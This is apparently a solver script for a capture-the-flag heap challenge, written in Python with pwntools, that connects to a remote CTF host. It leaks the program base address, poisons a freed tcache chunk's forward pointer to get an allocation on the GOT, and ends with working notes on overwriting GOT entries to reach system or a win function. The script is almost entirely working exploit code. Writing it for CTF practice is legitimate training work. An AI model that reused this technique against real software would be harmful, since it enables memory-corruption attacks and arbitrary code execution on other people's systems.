from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

def register(idx, count, size, data):
    p.sendline(b'1')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Item count: ')
    p.sendline(str(count).encode())
    p.recvuntil(b'Item size (bytes): ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data:\n')
    p.send(data)
    recv_menu()

def view(idx):
    p.sendline(b'2')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    res = p.recvuntil(b'\n\n===', drop=True)
    recv_menu()
    return res

def inspect(idx):
    p.sendline(b'3')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Validator    : ')
    validator = int(p.recvline().strip(), 16)
    p.recvuntil(b'Checkpoint   : ')
    checkpoint = int(p.recvline().strip(), 16)
    recv_menu()
    return validator, checkpoint

def delete(idx):
    p.sendline(b'4')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    recv_menu()

recv_menu()
register(0, 1, 16, b'A'*16)
register(1, 1, 16, b'B'*16)
register(2, 1, 16, b'C'*16)

val, chk0 = inspect(0)
_, chk1 = inspect(1)

base_addr = val - 0x136c
win_func = base_addr + 0x14a8
system_plt = base_addr + 0x1150

delete(2)
delete(1)
delete(0)

target_addr = base_addr + 0x35f0
fd = target_addr ^ (chk1 >> 12)

payload = b'A' * 24
payload += p64(0x21)
payload += p64(fd)

for i in range(2, 2000):
    payload = payload.ljust(i * 32 - 8, b'\x00')
    payload += p64(0x21)

payload = payload.ljust(65536, b'\x00')

p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Item count: ')
p.sendline(b'256')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'256')
p.recvuntil(b'data:\n')
p.send(payload)
recv_menu()

register(1, 1, 16, b'X'*16)

# Instead of overwriting free@got, let's overwrite __stack_chk_fail@got (0x3610) with system,
# or better: we don't have to use system! We can just use win_func!
# Wait, if we use system, we need /bin/sh.
# But win_func just calls `/usr/bin/uptime`? Wait, I saw "system" in win_func...
# If we look at win_func (0x14a8):
# 14b0: lea 0x21c9(%rip),%rdi # 3680 -> "/usr/bin/uptime"
# 14b7: call 1150 <system@plt>
# So it just executes uptime.
# BUT we can overwrite `printf@got` (0x3620) or `puts@got` (0x3600) or `exit@got` (0x3658).
# Wait, let's just leak `dl_runtime_resolve` (it's in libc) or we don't need it.
# We CAN read what is at 0x35f0!
# We can allocate a chunk at 0x35f0, and first use `view(2)` to leak it!
# `register(2)` doesn't let us read it? `register(2)` overwrites it!
# Wait, we can't allocate without overwriting because `register` reads `size` bytes from us!
# Unless we do `read` 0 bytes?
# Item count 1, item size 0?
# "Item size (bytes): 0" -> imul -> malloc(0) -> allocating 0x20 chunk -> reads 0 bytes!
# Let's see if we can do `register(2, 1, 0, b'')`.
p.close()
